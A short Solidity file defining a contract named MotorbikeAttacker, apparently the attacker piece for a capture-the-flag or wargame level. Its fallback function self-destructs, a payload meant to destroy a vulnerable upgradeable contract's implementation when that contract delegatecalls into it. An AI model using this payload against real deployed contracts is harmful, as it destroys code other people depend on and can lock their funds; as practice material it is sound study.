// SPDX-License-Identifier: GPL-3.0

pragma solidity <0.7.0;

contract MotorbikeAttacker {
    fallback() external {
        selfdestruct(msg.sender);
    }
}
